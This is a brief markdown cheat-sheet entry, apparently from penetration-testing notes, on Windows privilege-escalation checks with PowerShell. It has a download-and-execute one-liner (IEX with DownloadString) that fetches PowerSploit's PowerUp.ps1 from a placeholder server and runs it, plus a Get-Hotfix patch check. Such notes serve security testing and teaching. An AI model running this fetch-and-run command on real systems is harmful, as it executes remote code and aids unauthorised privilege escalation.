# Powershell

**Description:** A description of the entry

**Requirements:** powershell

## Running PowerUp to check for privilege escalation

```powershell
powershell "IEX (New-Object Net.WebClient).DownloadString('<server>/PowerUp.ps1'); Invoke-AllChecks"
```

Run PowerUp on system

## Checking for missing patches using Powershell

```powershell
Get-Hotfix KB*******
```

Checking missing patches (Powershell)

  
## References
* [Powersploit - PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
* [MSLearn - GetHotfix](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-hotfix?view=powershell-7.3)